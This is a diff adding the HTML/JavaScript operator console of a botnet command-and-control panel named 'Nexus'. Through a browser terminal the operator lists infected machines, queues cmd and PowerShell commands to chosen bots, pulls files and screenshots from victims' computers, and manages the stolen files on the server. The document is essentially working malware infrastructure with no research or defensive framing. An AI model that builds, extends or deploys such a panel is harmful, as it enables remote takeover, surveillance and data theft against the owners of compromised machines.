@@ -1,0 +1,288 @@
+<!DOCTYPE HTML>
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta charset="utf-8" />
+    <title>Nexus</title>
+    <meta name="author" content=""/>
+    <meta name="Description" content="Nexus"/>
+    <link rel="sitemap" type="application/xml" title="Sitemap" href=""/>
+    <link rel="shortcut icon" href="favicon.ico"/>
+    <script src="js/jquery-1.7.1.min.js"></script>
+    <script src="js/jquery.mousewheel-min.js"></script>
+    <script src="js/jquery.terminal.min.js"></script>
+    <link href="css/jquery.terminal.css" rel="stylesheet"/>
+	<style>
+	body {
+		background: url("nexus.jpg");
+		background-repeat: no-repeat;
+		background-attachment: fixed;
+		background-position: center;
+		background-size: cover;
+	}
+	tr {
+		border: 0px;
+	}
+	</style>
+  </head>
+<body>
+
+<script>
+	
+	var commands = ["help", "login", "clear", "botnet", "botcmd", "botpshell", "botcheck",
+		"botoutput", "botgetfile", "botgetscreen", "ls", "rm",
+		"downloadfile"];
+	var autocompletion = [];
+	var commandsindex = 0;
+			
+	//Add text to autocompletion	
+	function addToAutoCompletion(text) {
+		var acexists = false;
+		for (i in autocompletion) {
+			if (text == autocompletion[i]) {
+				acexists = true;
+				break;
+			}
+		}
+		if (!acexists && text != "")  autocompletion.push(text);
+	}
+	
+	//Add commands to autocompletion
+	for (i in commands) addToAutoCompletion(commands[i]);
+    
+	//Output a text to the console
+	function printTable(term, cells) {
+		var data = "";
+		for (j in cells) {
+			data += "<tr>";
+			for (i in cells[j]) {
+				if (i == 0) data+="<td>" + cells[j][i] + "</td>";
+				else data+="<td style='padding-left:32px;'>" + cells[j][i] + "</td>";
+	        }
+			data += "</tr>";
+			window.scrollTo(0,document.body.scrollHeight);
+		}
+		term.echo(data, {raw: true});
+    }
+
+jQuery(document).ready(function($) {
+    
+	function nexus(command, term) {
+		if (command == "") return;
+		var blocks = command.replace(/\s+/g," ").split(" ");
+        var args = blocks.length > 1 ? blocks.slice(1, blocks.length) : [];
+		
+		if (blocks[0] == "help")
+		{
+			term.echo("All the commands available:");
+			printTable(term, [["help", "", "show all the available commands"],
+				["login", "", "login/logout"],
+				["clear", "", "clear console"],
+				["botnet", "", "show all the bot and their status"],
+				["botcmd", "$botname $command","send dos command to bot"],
+	            ["botpshell", "$botname $command","send powershell command to bot"],
+				["botcheck", "$botname","check if there is a command in queue"],
+	            ["botoutput", "$botname","show last stored output data about the bot"],
+				["botgetfile", "$botname $filepath","upload file from bot to the server"],
+	            ["botgetscreen", "$botname","take a screenshot"],
+	            ["ls", "" , "show all the files stored in the server"],
+				["rm", "$filename","remove a file from the server"],
+				["downloadfile", "$filename","download a file from the server"]]);
+		}
+		else if (blocks[0] == "login")
+		{
+			term.login(loginfun, true);
+		}
+		else if (blocks[0] == "botnet")
+		{
+			//First request
+			var req = new XMLHttpRequest();
+			req.onload = function() {
+				if (this.responseText == "") {
+					term.echo("No bot found");
+					return;
+				}
+
+				var userdata = this.responseText.split("\n");
+				var table = []
+
+				var time = (new Date).getTime()/1000;
+				for (key in userdata) {
+					if (userdata[key] != "") {
+						var datablocks = userdata[key].split(",");
+						addToAutoCompletion(datablocks[0]);
+						var hours = Math.floor((time - parseInt(datablocks[1])) / 3600);
+						var minutes = Math.floor(((time - parseInt(datablocks[1])) / 60) % 60);
+						if (hours == 0 && minutes == 0) table.push([datablocks[0],"<font color='red'>ONLINE</font>", datablocks[2]]);
+						else table.push([datablocks[0], hours.toString() + "h " + minutes.toString() + "m ago", datablocks[2]]);
+					}
+				}
+				printTable(term, table);
+			};
+			req.open("get", "blist.php?type=bots");
+			req.send();
+		}
+		else if (blocks[0] == "botcmd")
+		{
+			var req = new XMLHttpRequest();
+			req.onload = function() {
+				term.echo(this.responseText);
+			};
+
+			var data = args[1];
+			var i = 0;
+			for (key in args) {
+				i++;
+				if (i < 3) { continue; }
+				data += "%20" + args[key];
+			}
+
+			//0 say this is a cmd command
+			if (data != "" && data != "undefined") data = "0" + data;
+
+			req.open("get", "bcommand.php?name=" + args[0] + "&func=set&data=" + data, true);
+			req.send();	
+		}
+		else if (blocks[0] == "botpshell")
+		{
+			var req = new XMLHttpRequest();
+			req.onload = function() {
+				term.echo(this.responseText);
+			};
+
+			var data = args[1];
+			var i = 0;
+			for (key in args) {
+				i++;
+				if (i < 3) { continue; }
+				data += "%20" + args[key];
+			}
+
+			//3 say this is a powershell command
+			data = "3" + data;
+
+			req.open("get", "bcommand.php?name=" + args[0] + "&func=set&data=" + data, true);
+			req.send();	
+		}
+		else if (blocks[0] == "botcheck")
+		{
+			var req = new XMLHttpRequest();
+			req.onload = function() {
+				if (this.responseText != "") term.echo(this.responseText);
+				else term.echo("No command in queue");
+			};
+
+			req.open("get", "bcommand.php?name=" + args[0] + "&func=check", true);
+			req.send();	
+		}
+		else if (blocks[0] == "botoutput")
+		{
+			var req = new XMLHttpRequest();
+			req.onload = function() {
+				if (this.responseText != "") term.echo(this.responseText);
+				else term.echo("No bot output found");
+			};
+
+			req.open("get", "breturn.php?name=" + blocks[1] + "&func=get", true);
+			req.send();	
+		}
+		else if (blocks[0] == "botgetfile")
+		{
+			var req = new XMLHttpRequest();
+			req.onload = function() {
+				term.echo(this.responseText);
+			};
+
+			var data = args[1];
+			var i = 0;
+			for (key in args) {
+				i++;
+				if (i < 3) { continue; }
+				data += "%20" + args[key];
+			}
+
+			//1 say this is a getfile command
+			data = "1" + data;
+
+			req.open("get", "bcommand.php?name=" + args[0] + "&func=set&data=" + data, true);
+			req.send();	
+		}
+		else if (blocks[0] == "botgetscreen")
+		{
+			var req = new XMLHttpRequest();
+			req.onload = function() {
+				term.echo(this.responseText);
+			};
+			req.open("get", "bcommand.php?name=" + args[0] + "&func=set&data=2", true);
+			req.send();	
+		}
+		else if (blocks[0] == "ls")
+		{
+			var req = new XMLHttpRequest();
+			req.onload = function() {
+
+				//Add to autocompletion
+				var blocks = this.responseText.split("\n");
+				for (i in blocks) addToAutoCompletion(blocks[i]);
+
+				//Print to console
+				if (this.responseText != "") term.echo(this.responseText);
+				else term.echo("No file found");
+			};
+
+			req.open("get", "files.php?func=list", true);
+			req.send();	
+			
+		}
+		else if (blocks[0] == "rm")
+		{
+			var req = new XMLHttpRequest();
+			req.onload = function() {
+				term.echo(this.responseText);
+			};
+
+			req.open("get", "files.php?func=remove&fname=" + args.join(" "), true);
+			req.send();	
+			
+		}
+		else if (blocks[0] == "downloadfile")
+		{
+			window.open("files/" + args.join(" "), "download");
+		}
+		else
+		{
+			term.echo("unknown command " + blocks[0]);
+		}
+	}
+	
+	function loginfun(user, password, callback) {
+		if (user != "user") {
+			callback(null);
+			return;
+		}
+		var req = new XMLHttpRequest();
+		req.onload = function() {
+			//if (true == true) {
+			if (this.responseText == "True") {
+				callback("LOGGEDIN");
+			}
+		}
+		req.open("get", "login.php?psw=" + password, true);
+		req.send();
+	}
+
+    $('body').terminal(nexus, 
+	{
+		name: 'nexus',
+		prompt: "[[gb;red;black]> ]",
+		greetings: "[[gb;red;black]Welcome in the nexus!]",
+		login: loginfun,
+		onBlur: function() { return false; },
+		tabcompletion: true,
+		completion: function(terminal, command, callback) {
+			callback(autocompletion);
+		}
+	});
+});
+
+</script>
+</body>
